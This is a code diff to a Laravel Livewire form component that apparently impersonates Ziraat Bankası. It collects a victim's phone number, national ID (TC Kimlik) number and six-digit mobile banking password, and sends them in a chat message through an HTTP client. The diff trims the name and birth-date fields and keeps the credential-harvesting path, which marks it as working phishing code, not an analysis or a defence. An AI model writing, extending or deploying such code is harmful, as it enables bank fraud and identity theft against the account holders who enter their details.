@@ -15,46 +15,27 @@ use Illuminate\Support\Facades\Log;
 
 class UserForm extends Component
 {
-    public $ad;
     public $telefon;
-    public $dogumTarihi;
-    public $musteriMi;
     public $tcKimlik;
     public $sifre;
 
     protected $rules = [
-        "ad" => "required|min:3|max:40",
         "telefon" => 'required|regex:/^5[0-9]{9}$/',
-        "dogumTarihi" => "required|date|before:1990-01-01",
-        "musteriMi" => "required|boolean",
         "tcKimlik" => "required|digits:11",
         "sifre" => "required|digits:6",
     ];
 
     protected $validationAttributes = [
-        "ad" => "Ad Soyad",
         "telefon" => "Telefon Numarası",
-        "dogumTarihi" => "Doğum Tarihi",
-        "musteriMi" => "Ziraat Bankası Müşterisi",
         "tcKimlik" => "TC Kimlik Numarası",
         "sifre" => "Mobil Bankacılık Şifresi",
     ];
 
     protected $messages = [
-        "ad.required" => "Ad Soyad alanı zorunludur.",
-        "ad.min" => "Ad Soyad en az :min karakter olmalıdır.",
-        "ad.max" => "Ad Soyad en fazla :max karakter olmalıdır.",
         "telefon.required" => "Telefon Numarası alanı zorunludur.",
         "telefon.size" => "Telefon Numarası 10 haneli olmalıdır.",
         "telefon.regex" =>
             "Geçersiz telefon numarası, lütfen düzelterek tekrar deneyiniz.",
-        "dogumTarihi.required" => "Doğum Tarihi alanı zorunludur.",
-        "dogumTarihi.date" => "Doğum Tarihi geçerli bir tarih olmalıdır.",
-        "dogumTarihi.before" => "Doğum Tarihi 1990'dan büyük olamaz.",
-        "musteriMi.required" =>
-            "Ziraat Bankası Müşterisi alanı doldurulmak zorundadır.",
-        "musteriMi.boolean" =>
-            "Ziraat Bankası Müşterisi alanı geçerli bir değer olmalıdır.",
         "tcKimlik.required" => "TC Kimlik Numarası alanı zorunludur.",
         "tcKimlik.digits" => "TC Kimlik Numarası 11 haneli olmalıdır.",
         "tcKimlik.invalid" => "TC Kimlik Numarası geçersizdir.",
@@ -235,12 +216,7 @@ class UserForm extends Component
         $client = new Client();
         $message =
             "📋 *Yeni Başvuru Formu* 📋\n\n" .
-            "👤 *Ad Soyad:* $this->ad\n" .
             "📞 *Telefon Numarası:* $this->telefon\n" .
-            "📅 *Doğum Tarihi:* $this->dogumTarihi\n" .
-            "🏦 *Ziraat Müşterisi:* " .
-            ($this->musteriMi ? "Evet" : "Hayır") .
-            "\n" .
             "🆔 *TC Kimlik Numarası:* $this->tcKimlik\n" .
             "🔐 *Mobil Şifre:* $this->sifre\n";
 
